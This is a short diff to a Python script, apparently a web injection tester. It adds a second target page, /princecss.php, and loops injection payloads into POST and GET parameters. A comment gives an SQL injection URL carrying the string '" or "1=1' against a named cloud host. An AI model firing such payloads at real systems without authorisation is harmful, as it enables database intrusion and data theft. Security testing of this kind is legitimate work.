@@ -98,8 +98,9 @@ if __name__ == "__main__":
 
 	
 	## check all pages
-	payloads = sqli.get_all()
-	url_list = ['/selections.php']
+	payloads = get_payloads()
+	url_list = ['/selections.php',
+	'/princecss.php']
 
 # http://ec2-54-254-145-200.ap-southeast-1.compute.amazonaws.com:8080/selections.php?years=%22%20or%20%221=1
 
@@ -107,3 +108,4 @@ if __name__ == "__main__":
 	for payload in payloads:
 		injectPayload(url_list[0],  "POST", "years", {"years":""}, payload)
 		injectPayload(url_list[0],  "POST", "artists", {"artists":""}, payload)
+		injectPayload(url_list[1], "GET", "target", {"target":""}, payload)
